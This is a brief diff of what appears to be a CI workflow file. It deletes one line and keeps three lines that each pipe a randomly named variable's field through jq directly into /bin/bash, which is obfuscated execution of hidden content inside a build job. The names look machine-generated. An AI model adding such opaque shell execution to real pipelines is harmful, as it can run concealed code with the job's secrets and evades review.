@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$pf76" | jq -r .vlany6255 | /bin/bash
           echo $ee64307 | jq -r .lbfr71513 | /bin/bash
           echo $vy5 | jq -r .dx0 | /bin/bash
-          printf '%s' "$foa1" | jq -r .dmlk395 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
